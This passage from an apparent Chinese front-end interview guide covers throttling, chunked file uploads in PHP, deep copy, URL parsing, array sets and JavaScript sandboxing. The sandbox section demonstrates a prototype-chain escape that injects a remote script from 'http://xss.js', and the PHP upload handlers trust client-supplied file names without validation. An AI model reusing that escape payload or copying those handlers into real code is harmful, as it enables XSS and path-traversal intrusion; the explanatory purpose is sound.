&#125;;\n&#125;\n\n使用闭包后，解决传参和封装防抖函数的问题，这样就可以在其他地方随便将需要防抖的函数传入debounce了。\n节流：\n每隔一段时间，只执行一次函数。\n\n定时器实现节流函数：\nfunction throttle(fn, delay) &#123;\n    var timer;\n    return function () &#123;\n        var _this = this;\n        var args = arguments;\n        if (timer) &#123;\n            return;\n        &#125;\n        timer = setTimeout(function () &#123;\n            fn.apply(_this, args);\n            timer = null; // 在delay后执行完fn之后清空timer，此时timer为假，throttle触发可以进入计时器\n        &#125;, delay)\n    &#125;\n&#125;\n\n时间戳实现节流函数：\nfunction throttle(fn, delay) &#123;\n    var previous = 0;\n    // 使用闭包返回一个函数并且用到闭包函数外面的变量previous\n    return function() &#123;\n        var _this = this;\n        var args = arguments;\n        var now = new Date();\n        if(now - previous > delay) &#123;\n            fn.apply(_this, args);\n            previous = now;\n        &#125;\n    &#125;\n&#125;\n\n异同比较\n相同点：\n\n都可以通过使用 setTimeout 实现。\n目的都是，降低回调执行频率。节省计算资源。\n\n不同点：\n\n函数防抖，在一段连续操作结束后，处理回调，利用clearTimeout 和 setTimeout实现。函数节流，在一段连续操作中，每一段时间只执行一次，频率较高的事件中使用来提高性能。\n函数防抖关注一定时间连续触发的事件只在最后执行一次，而函数节流侧重于一段时间内只执行一次。\n\n常见应用场景\n函数防抖的应用场景:\n连续的事件，只需触发一次回调的场景有：\n\n搜索框搜索输入。只需用户最后一次输入完，再发送请求\n手机号、邮箱验证输入检测\n窗口大小Resize。只需窗口调整完成后，计算窗口大小。防止重复渲染。\n\n函数节流的应用场景:\n间隔一段时间执行一次回调的场景有：\n\n滚动加载，加载更多或滚到底部监听\n谷歌搜索框，搜索联想功能\n高频点击提交，表单重复提交\n\n44、文件异步上传怎么实现参考答案：\n1.普通表单上传使用PHP来展示常规的表单上传是一个不错的选择。首先构建文件上传的表单，并指定表单的提交内容类型为enctype=&quot;multipart/form-data&quot;，表明表单需要上传二进制数据。\n&lt;form action=\"/index.php\" method=\"POST\" enctype=\"multipart/form-data\">\n  &lt;input type=\"file\" name=\"myfile\">\n  &lt;input type=\"submit\">\n&lt;/form>\n\n然后编写index.php上传文件接收代码，使用move_uploaded_file方法即可(php大法好…)\n$imgName = 'IMG'.time().'.'.str_replace('image/','',$_FILES[\"myfile\"]['type']);\n$fileName =  'upload/'.$imgName;\n// 移动上传文件至指定upload文件夹下，并根据返回值判断操作是否成功\nif (move_uploaded_file($_FILES['myfile']['tmp_name'], $fileName))&#123;\n    echo $fileName;\n&#125;else &#123;\n    echo \"nonn\";\n&#125;\n\nform表单上传大文件时，很容易遇见服务器超时的问题。通过xhr，前端也可以进行异步上传文件的操作，一般由两个思路。\n2.文件编码上传第一个思路是将文件进行编码，然后在服务端进行解码，之前写过一篇在前端实现图片压缩上传的博客，其主要实现原理就是将图片转换成base64进行传递\nvar imgURL = URL.createObjectURL(file);\nctx.drawImage(imgURL, 0, 0);\n// 获取图片的编码，然后将图片当做是一个很长的字符串进行传递\nvar data = canvas.toDataURL(\"image/jpeg\", 0.5); \n\n在服务端需要做的事情也比较简单，首先解码base64，然后保存图片即可\n$imgData = $_REQUEST['imgData'];\n$base64 = explode(',', $imgData)[1];\n$img = base64_decode($base64);\n$url = './test.jpg';\nif (file_put_contents($url, $img)) &#123;\n    exit(json_encode(array(\n        url => $url\n    )));\n&#125;\n\nbase64编码的缺点在于其体积比原图片更大（因为Base64将三个字节转化成四个字节，因此编码后的文本，会比原文本大出三分之一左右），对于体积很大的文件来说，上传和解析的时间会明显增加。\n更多关于base64的知识，可以参考Base64笔记。\n除了进行base64编码，还可以在前端直接读取文件内容后以二进制格式上传\n// 读取二进制文件\nfunction readBinary(text)&#123;\n   var data = new ArrayBuffer(text.length);\n   var ui8a = new Uint8Array(data, 0);\n   for (var i = 0; i &lt; text.length; i++)&#123; \n     ui8a[i] = (text.charCodeAt(i) &amp; 0xff);\n   &#125;\n   console.log(ui8a)\n&#125;\n\nvar reader = new FileReader();\nreader.onload = function()&#123;\n    readBinary(this.result) // 读取result或直接上传\n&#125;\n// 把从input里读取的文件内容，放到fileReader的result字段里\nreader.readAsBinaryString(file);\n\n3.formData异步上传FormData对象主要用来组装一组用 XMLHttpRequest发送请求的键&#x2F;值对，可以更加灵活地发送Ajax请求。可以使用FormData来模拟表单提交。\nlet files = e.target.files // 获取input的file对象\nlet formData = new FormData();\nformData.append('file', file);\naxios.post(url, formData);\n\n服务端处理方式与直接form表单请求基本相同。\n4.iframe无刷新页面在低版本的浏览器（如IE）上，xhr是不支持直接上传formdata的，因此只能用form来上传文件，而form提交本身会进行页面跳转，这是因为form表单的target属性导致的，其取值有\n\n_self，默认值，在相同的窗口中打开响应页面\n\n_blank，在新窗口打开\n\n_parent，在父窗口打开\n_top，在最顶层的窗口打开\n\nframename，在指定名字的iframe中打开\n\n\n如果需要让用户体验异步上传文件的感觉，可以通过framename指定iframe来实现。把form的target属性设置为一个看不见的iframe，那么返回的数据就会被这个iframe接受，因此只有该iframe会被刷新，至于返回结果，也可以通过解析这个iframe内的文本来获取。\nfunction upload()&#123;\n    var now = +new Date()\n    var id = 'frame' + now\n    $(\"body\").append(`&lt;iframe style=\"display:none;\" name=\"$&#123;id&#125;\" id=\"$&#123;id&#125;\" />`);\n\n    var $form = $(\"#myForm\")\n    $form.attr(&#123;\n        \"action\": '/index.php',\n        \"method\": \"post\",\n        \"enctype\": \"multipart/form-data\",\n        \"encoding\": \"multipart/form-data\",\n        \"target\": id\n    &#125;).submit()\n\n    $(\"#\"+id).on(\"load\", function()&#123;\n        var content = $(this).contents().find(\"body\").text()\n        try&#123;\n            var data = JSON.parse(content)\n        &#125;catch(e)&#123;\n            console.log(e)\n        &#125;\n    &#125;)\n&#125;\n\n扩展：\n大文件上传\n现在来看看在上面提到的几种上传方式中实现大文件上传会遇见的超时问题，\n\n表单上传和iframe无刷新页面上传，实际上都是通过form标签进行上传文件，这种方式将整个请求完全交给浏览器处理，当上传大文件时，可能会遇见请求超时的情形\n通过fromData，其实际也是在xhr中封装一组请求参数，用来模拟表单请求，无法避免大文件上传超时的问题\n编码上传，我们可以比较灵活地控制上传的内容\n\n大文件上传最主要的问题就在于：在同一个请求中，要上传大量的数据，导致整个过程会比较漫长，且失败后需要重头开始上传。试想，如果我们将这个请求拆分成多个请求，每个请求的时间就会缩短，且如果某个请求失败，只需要重新发送这一次请求即可，无需从头开始，这样是否可以解决大文件上传的问题呢？\n综合上面的问题，看来大文件上传需要实现下面几个需求\n\n支持拆分上传请求(即切片)\n支持断点续传\n支持显示上传进度和暂停上传\n\n接下来让我们依次实现这些功能，看起来最主要的功能应该就是切片了。\n文件切片\n编码方式上传中，在前端我们只要先获取文件的二进制内容，然后对其内容进行拆分，最后将每个切片上传到服务端即可。\n在JavaScript中，文件FIle对象是Blob对象的子类，Blob对象包含一个重要的方法slice，通过这个方法，我们就可以对二进制文件进行拆分。\n下面是一个拆分文件的示例\nfunction slice(file, piece = 1024 * 1024 * 5) &#123;\n let totalSize = file.size; // 文件总大小\n let start = 0; // 每次上传的开始字节\n let end = start + piece; // 每次上传的结尾字节\n let chunks = []\n while (start &lt; totalSize) &#123;\n // 根据长度截取每次需要上传的数据\n // File对象继承自Blob对象，因此包含slice方法\n let blob = file.slice(start, end); \n chunks.push(blob)\n start = end;\n end = start + piece;\n &#125;\n return chunks\n&#125;\n\n将文件拆分成piece大小的分块，然后每次请求只需要上传这一个部分的分块即可\nlet file = document.querySelector(\"[name=file]\").files[0];\nconst LENGTH = 1024 * 1024 * 0.1;\nlet chunks = slice(file, LENGTH); // 首先拆分切片\nchunks.forEach(chunk=>&#123;\n let fd = new FormData();\n fd.append(\"file\", chunk);\n post('/mkblk.php', fd)\n&#125;)\n\n服务器接收到这些切片后，再将他们拼接起来就可以了，下面是PHP拼接切片的示例代码\n$filename = './upload/' . $_POST['filename'];//确定上传的文件名\n//第一次上传时没有文件，就创建文件，此后上传只需要把数据追加到此文件中\nif(!file_exists($filename))&#123;\n move_uploaded_file($_FILES['file']['tmp_name'],$filename);\n&#125;else&#123;\n file_put_contents($filename,file_get_contents($_FILES['file']['tmp_name']),FILE_APPEND);\n echo $filename;\n&#125;\n\n测试时记得修改nginx的server配置，否则大文件可能会提示413 Request Entity Too Large的错误。\nserver &#123;\n  // ...\n  client_max_body_size 50m;\n&#125;\n\n上面这种方式来存在一些问题\n\n无法识别一个切片是属于哪一个切片的，当同时发生多个请求时，追加的文件内容会出错\n切片上传接口是异步的，无法保证服务器接收到的切片是按照请求顺序拼接的\n\n因此接下来我们来看看应该如何在服务端还原切片。\n还原切片\n在后端需要将多个相同文件的切片还原成一个文件，上面这种处理切片的做法存在下面几个问题\n\n如何识别多个切片是来自于同一个文件的，这个可以在每个切片请求上传递一个相同文件的context参数\n如何将多个切片还原成一个文件\n确认所有切片都已上传，这个可以通过客户端在切片全部上传后调用mkfile接口来通知服务端进行拼接\n找到同一个context下的所有切片，确认每个切片的顺序，这个可以在每个切片上标记一个位置索引值\n按顺序拼接切片，还原成文件\n\n上面有一个重要的参数，即context，我们需要获取为一个文件的唯一标识，可以通过下面两种方式获取\n\n根据文件名、文件长度等基本信息进行拼接，为了避免多个用户上传相同的文件，可以再额外拼接用户信息如uid等保证唯一性\n根据文件的二进制内容计算文件的hash，这样只要文件内容不一样，则标识也会不一样，缺点在于计算量比较大.\n\n修改上传代码，增加相关参数\n// 获取context，同一个文件会返回相同的值\nfunction createContext(file) &#123;\n  return file.name + file.length\n&#125;\nlet file = document.querySelector(\"[name=file]\").files[0];\nconst LENGTH = 1024 * 1024 * 0.1;\nlet chunks = slice(file, LENGTH);\n// 获取对于同一个文件，获取其的context\nlet context = createContext(file);\nlet tasks = [];\nchunks.forEach((chunk, index) => &#123;\n let fd = new FormData();\n fd.append(\"file\", chunk);\n // 传递context\n fd.append(\"context\", context);\n // 传递切片索引值\n fd.append(\"chunk\", index + 1);\n\n tasks.push(post(\"/mkblk.php\", fd));\n&#125;);\n// 所有切片上传完毕后，调用mkfile接口\nPromise.all(tasks).then(res => &#123;\n let fd = new FormData();\n fd.append(\"context\", context);\n fd.append(\"chunks\", chunks.length);\n post(\"/mkfile.php\", fd).then(res => &#123;\n console.log(res);\n &#125;);\n&#125;);\n\n在mkblk.php接口中，我们通过context来保存同一个文件相关的切片\n// mkblk.php\n$context = $_POST['context'];\n$path = './upload/' . $context;\nif(!is_dir($path))&#123;\n mkdir($path);\n&#125;\n// 把同一个文件的切片放在相同的目录下\n$filename = $path .'/'. $_POST['chunk'];\n$res = move_uploaded_file($_FILES['file']['tmp_name'],$filename);\n\n除了上面这种简单通过目录区分切片的方法之外，还可以将切片信息保存在数据库来进行索引。接下来是mkfile.php接口的实现，这个接口会在所有切片上传后调用\n// mkfile.php\n$context = $_POST['context'];\n$chunks = (int)$_POST['chunks'];\n//合并后的文件名\n$filename = './upload/' . $context . '/file.jpg'; \nfor($i = 1; $i &lt;= $chunks; ++$i)&#123;\n $file = './upload/'.$context. '/' .$i; // 读取单个切块\n $content = file_get_contents($file);\n if(!file_exists($filename))&#123;\n $fd = fopen($filename, \"w+\");\n &#125;else&#123;\n $fd = fopen($filename, \"a\");\n &#125;\n fwrite($fd, $content); // 将切块合并到一个文件上\n&#125;\necho $filename;\n\n这样就解决了上面的两个问题：\n\n识别切片来源\n保证切片拼接顺序\n\n断点续传\n即使将大文件拆分成切片上传，我们仍需等待所有切片上传完毕，在等待过程中，可能发生一系列导致部分切片上传失败的情形，如网络故障、页面关闭等。由于切片未全部上传，因此无法通知服务端合成文件。这种情况下可以通过断点续传来进行处理。\n断点续传指的是：可以从已经上传部分开始继续上传未完成的部分，而没有必要从头开始上传，节省上传时间。\n由于整个上传过程是按切片维度进行的，且mkfile接口是在所有切片上传完成后由客户端主动调用的，因此断点续传的实现也十分简单：\n\n在切片上传成功后，保存已上传的切片信息\n当下次传输相同文件时，遍历切片列表，只选择未上传的切片进行上传\n所有切片上传完毕后，再调用mkfile接口通知服务端进行文件合并\n\n因此问题就落在了如何保存已上传切片的信息了，保存一般有两种策略\n\n可以通过locaStorage等方式保存在前端浏览器中，这种方式不依赖于服务端，实现起来也比较方便，缺点在于如果用户清除了本地文件，会导致上传记录丢失\n服务端本身知道哪些切片已经上传，因此可以由服务端额外提供一个根据文件context查询已上传切片的接口，在上传文件前调用该文件的历史上传记录\n\n下面让我们通过在本地保存已上传切片记录，来实现断点上传的功能\n// 获取已上传切片记录\nfunction getUploadSliceRecord(context)&#123;\n let record = localStorage.getItem(context)\n if(!record)&#123;\n return []\n &#125;else &#123;\n try&#123;\n return JSON.parse(record)\n &#125;catch(e)&#123;&#125;\n &#125;\n&#125;\n// 保存已上传切片\nfunction saveUploadSliceRecord(context, sliceIndex)&#123;\n let list = getUploadSliceRecord(context)\n list.push(sliceIndex)\n localStorage.setItem(context, JSON.stringify(list))\n&#125;\n\n然后对上传逻辑稍作修改，主要是增加上传前检测是已经上传、上传后保存记录的逻辑\nlet context = createContext(file);\n// 获取上传记录\nlet record = getUploadSliceRecord(context);\nlet tasks = [];\nchunks.forEach((chunk, index) => &#123;\n // 已上传的切片则不再重新上传\n if(record.includes(index))&#123;\n return\n &#125;\n\n let fd = new FormData();\n fd.append(\"file\", chunk);\n fd.append(\"context\", context);\n fd.append(\"chunk\", index + 1);\n let task = post(\"/mkblk.php\", fd).then(res=>&#123;\n // 上传成功后保存已上传切片记录\n saveUploadSliceRecord(context, index)\n record.push(index)\n &#125;)\n tasks.push(task);\n&#125;);\n\n此时上传时刷新页面或者关闭浏览器，再次上传相同文件时，之前已经上传成功的切片就不会再重新上传了。\n服务端实现断点续传的逻辑基本相似，只要在getUploadSliceRecord内部调用服务端的查询接口获取已上传切片的记录即可，因此这里不再展开。\n此外断点续传还需要考虑切片过期的情况：如果调用了mkfile接口，则磁盘上的切片内容就可以清除掉了，如果客户端一直不调用mkfile的接口，放任这些切片一直保存在磁盘显然是不可靠的，一般情况下，切片上传都有一段时间的有效期，超过该有效期，就会被清除掉。基于上述原因，断点续传也必须同步切片过期的实现逻辑。\n上传进度和暂停\n通过xhr.upload中的progress方法可以实现监控每一个切片上传进度。\n上传暂停的实现也比较简单，通过xhr.abort可以取消当前未完成上传切片的上传，实现上传暂停的效果，恢复上传就跟断点续传类似，先获取已上传的切片列表，然后重新发送未上传的切片。\n由于篇幅关系，上传进度和暂停的功能这里就先不实现了。\n45、使用setInterval请求实时数据，返回顺序不一致怎么解决参考答案：\n场景：\nsetInterval(function() &#123;\n    $.get(\"/path/to/server\", function(data, status) &#123;\n        console.log(data);\n    &#125;);\n&#125;, 10000);\n\n上面的程序会每隔10秒向服务器请求一次数据，并在数据到达后存储。这个实现方法通常可以满足简单的需求，然而同时也存在着很大的缺陷：在网络情况不稳定的情况下，服务器从接收请求、发送请求到客户端接收请求的总时间有可能超过10秒，而请求是以10秒间隔发送的，这样会导致接收的数据到达先后顺序与发送顺序不一致。\n解决方案：\n\n使用setTimeout代替setInterval\n程序首先设置10秒后发起请求，当数据返回后再隔10秒发起第二次请求，以此类推。这样的话虽然无法保证两次请求之间的时间间隔为固定值，但是可以保证到达数据的顺序。\nfunction poll() &#123;\n    setTimeout(function() &#123;\n        $.get(\"/path/to/server\", function(data, status) &#123;\n            console.log(data);\n            // 发起下一次请求\n            poll();\n        &#125;);\n    &#125;, 10000);\n&#125;\n\nWebSocket\nWebSocket 协议本质上是一个基于 TCP 的协议。\n为了建立一个 WebSocket 连接，客户端浏览器首先要向服务器发起一个 HTTP 请求，这个请求和通常的 HTTP 请求不同，包含了一些附加头信息，其中附加头信息”Upgrade: WebSocket”表明这是一个申请协议升级的 HTTP 请求，服务器端解析这些附加的头信息然后产生应答信息返回给客户端，客户端和服务器端的 WebSocket 连接就建立起来了，双方就可以通过这个连接通道自由的传递信息，并且这个连接会持续存在直到客户端或者服务器端的某一方主动的关闭连接。\n服务器（Node.js）：\nvar WebSocketServer = require('ws').Server;\nvar wss = new WebSocketServer(&#123;port: 8080&#125;);\n\nwss.on(\"connection\", function(socket) &#123;\n    socket.on(\"message\", function(msg) &#123;\n        console.log(msg);\n        socket.send(\"Nice to meet you!\");\n    &#125;);\n&#125;);\n\n客户端同样可以使用Node.js或者是浏览器实现，这里选用浏览器作为客户端：\n// WebSocket 为客户端JavaScript的原生对象\nvar ws = new WebSocket(\"ws://localhost:8080\");\nws.onopen = function (event) &#123;\n    ws.send(\"Hello there!\");\n&#125;\nws.onmessage = function (event) &#123;\n    console.log(event.data);\n&#125;\n\n46、浅拷贝，深拷贝(实现方式)参考答案：\n浅拷贝和深拷贝都只针对于引用数据类型，浅拷贝只复制指向某个对象的指针，而不复制对象本身，新旧对象还是共享同一块内存；但深拷贝会另外创造一个一模一样的对象，新对象跟原对象不共享内存，修改新对象不会改到原对象；\n区别：浅拷贝只复制对象的第一层属性、深拷贝可以对对象的属性进行递归复制；\n实现浅拷贝方法\n（1）Object.assign方法\nvar obj = &#123;\n    a: 1,\n    b: 2\n&#125;\nvar obj1 = Object.assign(&#123;&#125;,obj);\nboj1.a = 3;\nconsole.log(obj.a) // 3\n\n（2）for in方法\n// 只复制第一层的浅拷贝\nfunction simpleCopy(obj1) &#123;\n   var obj2 = Array.isArray(obj1) ? [] : &#123;&#125;;\n   for (let i in obj1) &#123;\n   obj2[i] = obj1[i];\n  &#125;\n   return obj2;\n&#125;\nvar obj1 = &#123;\n   a: 1,\n   b: 2,\n   c: &#123;\n         d: 3\n      &#125;\n&#125;\nvar obj2 = simpleCopy(obj1);\nobj2.a = 3;\nobj2.c.d = 4;\nalert(obj1.a); // 1\nalert(obj2.a); // 3\nalert(obj1.c.d); // 4\nalert(obj2.c.d); // 4\n\n实现深拷贝方法\n（1）采用递归去拷贝所有层级属性\nfunction deepClone(obj)&#123;\n    let objClone = Array.isArray(obj)?[]:&#123;&#125;;\n    if(obj &amp;&amp; typeof obj===\"object\")&#123;\n        for(key in obj)&#123;\n            if(obj.hasOwnProperty(key))&#123;\n                //判断ojb子元素是否为对象，如果是，递归复制\n                if(obj[key]&amp;&amp;typeof obj[key] ===\"object\")&#123;\n                    objClone[key] = deepClone(obj[key]);\n                &#125;else&#123;\n                    //如果不是，简单复制\n                    objClone[key] = obj[key];\n                &#125;\n            &#125;\n        &#125;\n    &#125;\n    return objClone;\n&#125;    \nlet a=[1,2,3,4],\n    b=deepClone(a);\na[0]=2;\nconsole.log(a,b);\n\n（2）使用JSON.stringify和JSON.parse实现深拷贝：JSON.stringify把对象转成字符串，再用JSON.parse把字符串转成新的对象；\nfunction deepCopy(obj1)&#123;\n    let _obj = JSON.stringify(obj1);\n    let obj2 = JSON.parse(_obj);\n    return obj2;\n  &#125;\n    var a = [1, [1, 2], 3, 4];\n    var b = deepCopy(a);\n    b[1][0] = 2;\n    alert(a); // 1,1,2,3,4\n    alert(b); // 2,2,2,3,4\n\n（3）热门的函数库lodash，也有提供_.cloneDeep用来做深拷贝；\nvar _ = require('lodash');\nvar obj1 = &#123;\n    a: 1,\n    b: &#123; f: &#123; g: 1 &#125; &#125;,\n    c: [1, 2, 3]\n&#125;;\nvar obj2 = _.cloneDeep(obj1);\nconsole.log(obj1.b.f === obj2.b.f);\n// false\n\n\n\n47、获取当前页面url参考答案：\n\nwindow.location.href (设置或获取整个 URL 为字符串)\n\nvar test = window.location.href;\nalert(test);\n//  返回：http://i.cnblogs.com/EditPosts.aspx?opt=1\n\n\nwindow.location.protocol (设置或获取 URL 的协议部分)\n\nvar test = window.location.protocol;\nalert(test);\n//返回：http:\n\n\nwindow.location.host (设置或获取 URL 的主机部分)\n\nvar test = window.location.host;\nalert(test);\n//返回：i.cnblogs.com\n\n\nwindow.location.port (设置或获取与 URL 关联的端口号码)\n\nvar test = window.location.port;\nalert(test);\n//返回：空字符(如果采用默认的80端口 (update:即使添加了:80)，那么返回值并不是默认的80而是空字符)\n\n\nwindow.location.pathname (设置或获取与 URL 的路径部分（就是文件地址）)\n\nvar test = window.location.pathname;\nalert(test);\n//返回：/EditPosts.aspx\n\n\nwindow.location.search (设置或获取 href 属性中跟在问号后面的部分)\n\nvar test = window.location.search;\nalert(test);\n//返回：?opt=1\n（PS：获得查询（参数）部分，除了给动态语言赋值以外，我们同样可以给静态页面，并使用javascript来获得相信应的参数值。）\n\n\nwindow.location.hash (设置或获取 href 属性中在井号“#”后面的分段)\n\nvar test = window.location.hash;\nalert(test);\n//返回：空字符(因为url中没有)\n\n\njs获取url中的参数值*\n正则法\n\n\n function getQueryString(name) &#123;\n          var reg = new RegExp('(^|&amp;)' + name + '=([^&amp;]*)(&amp;|$)', 'i');\n          var r = window.location.search.substr(1).match(reg);\n\n          if (r != null) &#123;\n             return unescape(r[2]);\n          &#125;\n          return null;\n  &#125;\n// 这样调用：\nalert(GetQueryString(\"参数名1\"));\nalert(GetQueryString(\"参数名2\"));\nalert(GetQueryString(\"参数名3\"));\n\n split拆分法\nfunction GetRequest() &#123;\n         var url = location.search; //获取url中\"?\"符后的字串\n         var theRequest = new Object();\n\n         if (url.indexOf(\"?\") != -1) &#123;\n                 var str = url.substr(1);\n                 strs = str.split(\"&amp;\");\n              for(var i = 0; i &lt; strs.length; i ++) &#123;\n                      theRequest[strs[i].split(\"=\")[0]] = unescape(strs[i].split(\"=\")[1]);\n               &#125;\n         &#125;\n     return theRequest;\n &#125;\nvar Request = new Object();\nRequest = GetRequest();&lt;br>// var id=Request[\"id\"]; \n// var 参数1,参数2,参数3,参数N;\n// 参数1 = Request['参数1'];\n// 参数2 = Request['参数2'];\n// 参数3 = Request['参数3'];\n// 参数N = Request['参数N'];\n\n 指定取比如说一个url：http://i.cnblogs.com/?j=js, 我们想得到参数j的值，可以通过以下函数调用。\nfunction GetQueryString(name) &#123; \n         var reg = new RegExp(\"(^|&amp;)\" + name + \"=([^&amp;]*)(&amp;|$)\", \"i\"); \n         var r = window.location.search.substr(1).match(reg); //获取url中\"?\"符后的字符串并正则匹配\n         var context = \"\"; \n\n     if (r != null) \n     context = r[2]; \n    reg = null; \n    r = null; \n    return context == null || context == \"\" || context == \"undefined\" ? \"\" : context; \n &#125;\nalert(GetQueryString(\"j\"));\n\n 单个参数的获取方法\nfunction GetRequest() &#123;\n         var url = location.search; //获取url中\"?\"符后的字串\n         if (url.indexOf(\"?\") != -1) &#123;? //判断是否有参数\n                  var str = url.substr(1); //从第一个字符开始 因为第0个是?号 获取所有除问号的所有符串\n                  strs = str.split(\"=\");? //用等号进行分隔 （因为知道只有一个参数 \n                                          //所以直接用等号进分隔 如果有多个参数 要用&amp;号分隔 再用等号进行分隔）\n                  alert(strs[1]);???? //直接弹出第一个参数 （如果有多个参数 还要进行循环的）\n         &#125;\n  &#125;\n\n\n\n\n\n48、js中两个数组怎么取交集+(差集、并集、补集)ES5：交集：\nlet arr1 = [1, 2, 3, 4, 5, 6];\nlet arr2 = [3, 4, 5, 6, 7, 8, 9];\nfunction getIntersection(arr1, arr2) &#123;\n  let newArr = arr1.filter((item) => &#123;\n    console.log(arr2.indexOf(item));\n    return arr2.indexOf(item) > -1\n  &#125;);\n  return newArr;\n&#125;\n// console.log(getIntersection(arr1, arr2));\n\n\n\n并集：\nfunction getSet(arr1, arr2) &#123;\n  let newArr = arr2.filter((item) => &#123;\n    return arr1.indexOf(item) == -1;\n  &#125;);\n  return arr1.concat(newArr);\n&#125;\nconsole.log(getSet(arr1, arr2));\n\n\n补集：\nfunction getComplement(arr1, arr2) &#123;\n  let newArr1 = arr1.filter((item) => &#123;\n    return arr2.indexOf(item) == -1;\n  &#125;);\n  let newArr2 = arr2.filter((item) => &#123;\n    return arr1.indexOf(item) == -1;\n  &#125;);\n  return newArr1.concat(newArr2);\n&#125;\n\n\n\nES6：交集：\nlet arr1 = [1, 2, 3, 4, 5, 6];\nlet arr2 = [3, 4, 5, 6, 7, 8, 9];\n\nfunction getIntersection(arr1, arr2) &#123;\n  let y = new Set(arr2);\n  return arr1.filter((x) => y.has(x));\n&#125;\nconsole.log(getIntersection(arr1, arr2));\n\n\n\n\n并集：\nlet arr1 = [1, 2, 3, 4, 5, 6];\nlet arr2 = [3, 4, 5, 6, 7, 8, 9];\nfunction getSet(arr1, arr2) &#123;\n  let x = arr1.concat(arr2);\n  return [...new Set(x)];\n&#125;\nconsole.log(getSet(arr1, arr2));\n\n\n\n\n49、沙箱隔离怎么做的什么原理参考答案：\n沙箱，即sandbox，顾名思义，就是让你的程序跑在一个隔离的环境下，不对外界的其他程序造成影响，通过创建类似沙盒的独立作业环境，在其内部运行的程序并不能对硬盘产生永久性的影响。\n实现沙箱的三种方法\n\n借助with + new Function\n\n首先从最简陋的方法说起，假如你想要通过eval和function直接执行一段代码，这是不现实的，因为代码内部可以沿着作用域链往上找，篡改全局变量，这是我们不希望的，所以你需要让沙箱内的变量访问都在你的监控范围内；不过，你可以使用with API，在with的块级作用域下，变量访问会优先查找你传入的参数对象，之后再往上找，所以相当于你变相监控到了代码中的“变量访问”：\nfunction compileCode (src) &#123;    \n  src = 'with (exposeObj) &#123;' + src + '&#125;'  \n  return new Function('exposeObj', src)   \n&#125;\n\n接下里你要做的是，就是暴露可以被访问的变量exposeObj，以及阻断沙箱内的对外访问。通过es6提供的proxy特性，可以获取到对对象上的所有改写：\nfunction compileCode (src) &#123;    \n  src = `with (exposeObj) &#123; $&#123;src&#125; &#125;` \n  return new Function('exposeObj', src)   \n&#125; \nfunction proxyObj(originObj)&#123; \n    let exposeObj = new Proxy(originObj,&#123; \n        has:(target,key)=>&#123; \n            if([\"console\",\"Math\",\"Date\"].indexOf(key)>=0)&#123;  \n                return target[key]  \n            &#125; \n            if(!target.hasOwnProperty(key))&#123;  \n                throw new Error(`Illegal operation for key $&#123;key&#125;`) \n            &#125; \n            return target[key]  \n        &#125;,\n    &#125;)  \n    return exposeObj  \n\n&#125; \nfunction createSandbox(src,obj)&#123;  \n let proxy = proxyObj(obj)  \n compileCode(src).call(proxy,proxy) //绑定this 防止this访问window \n&#125;\n\n通过设置has函数，可以监听到变量的访问，在上述代码中，仅暴露个别外部变量供代码访问，其余不存在的属性，都会直接抛出error。其实还存在get、set函数，但是如果get和set函数只能拦截到当前对象属性的操作，对外部变量属性的读写操作无法监听到，所以只能使用has函数了。接下来我们测试一下：\nconst testObj = &#123; \n    value:1,  \n    a:&#123; \n        b:  \n    &#125; \n&#125; \ncreateSandbox(\"value='haha';console.log(a)\",testObj)\n\n看起来一切似乎没有什么问题，但是问题出在了传入的对象，当调用的是console.log(a.b)的时候，has方法是无法监听到对b属性的访问的，假设所执行的代码是不可信的，这时候，它只需要通过a.b.proto就可以访问到Object构造函数的原型对象，再对原型对象进行一些篡改，例如将toString就能影响到外部的代码逻辑的。\ncreateSandbox(` \na.b.__proto__.toString = ()=>&#123;  \n new (()=>&#123;&#125;).constructor(\"var script = document.createElement('script'); \n script.src = 'http://xss.js';\n script.type = 'text/javascript'; \n document.body.appendChild(script);\")() \n&#125;\n`,testObj)  \nconsole.log(testObj.a.b.__proto__.toString())\n\n例如上面所展示的代码，通过访问原型链的方式，实现了沙箱逃逸，并且篡改了原型链上的toString方法，一旦外部的代码执行了toString方法，就可以实现xss攻击，注入第三方代码；由于在内部定义执行的函数代码逻辑，仍然会沿着作用于链查找，为了绕开作用域链的查找，笔者通过访问箭头函数的constructor的方式拿到了构造函数Function，这个时候，Funtion内所执行的xss代码，在执行的时候，便不会再沿着作用域链往上找，而是直接在全局作用域下执行，通过这样的方式，实现了沙箱逃逸以及xss攻击。\n你可能会想，如果我切断原型链的访问，是否就杜绝了呢？的确，你可以通过Object.create(null)的方式，传入一个不含有原型链的对象，并且让暴露的对象只有一层，不传入嵌套的对象，但是，即使是基本类型值，数字或字符串，同样也可以通过proto查找到原型链，而且，即使不传入对象，你还可以通过下面这种方式绕过：\n(&#123;&#125;).__proto__.toString= ()=>&#123;console.log(111)&#125;;\n\n可见，new Function + with的这种沙箱方式，防君子不防小人，当然，你也可以通过对传入的code代码做代码分析或过滤？假如传入的代码不是按照的规定的数据格式（例如json），就直接抛出错误，阻止恶意代码注入，但这始终不是一种安全的做法。\n\n借助iframe实现沙箱\n\n前面介绍一种劣质的、不怎么安全的方法构造了一个简单的沙箱，但是在前端最常见的方法，还是利用iframe来构造一个沙箱\n&lt;iframe sandbox src=\"...\">&lt;/iframe>\n\n 但是这也会带来一些限制：\n\nscript脚本不能执行\n\n不能发送ajax请求\n\n不能使用本地存储，即localStorage,cookie等\n\n不能创建新的弹窗和window\n\n不能发送表单\n\n不能加载额外插件比如flash等\n不过别方，你可以对这个iframe标签进行一些配置：\n\n\n\n接下里你只需要结合postMessage API，将你需要执行的代码，和需要暴露的数据传递过去，然后和你的iframe页面通信就行了。\n1）需要注意的是，在子页面中，要注意不要让执行代码访问到contentWindow对象，因为你需要调用contentWindow的postMessageAPI给父页面传递信息，假如恶意代码也获取到了contentWindow对象，相当于就拿到了父页面的控制权了，这个时候可大事不妙。\n2）当使用postMessageAPI的时候，由于sandbox的origin默认为null，需要设置allow-same-origin允许两个页面进行通信，意味着子页面内可以发起请求，这时候需要防范好CSRF，允许了同域请求，不过好在，并没有携带上cookie。\n3）当调用postMessageAPI传递数据给子页面的时候，传输的数据对象本身已经通过结构化克隆算法复制\n简单的说，通过postMessageAPI传递的对象，已经由浏览器处理过了，原型链已经被切断，同时，传过去的对象也是复制好了的，占用的是不同的内存空间，两者互不影响，所以你不需要担心出现第一种沙箱做法中出现的问题。\n\nnodejs中的沙箱\n\nnodejs中使用沙箱很简单，只需要利用原生的vm模块，便可以快速创建沙箱，同时指定上下文。\nconst vm = require('vm'); \nconst x = 1;  \nconst sandbox = &#123; x: 2 &#125;; \nvm.createContext(sandbox); // Contextify the sandbox. \nconst 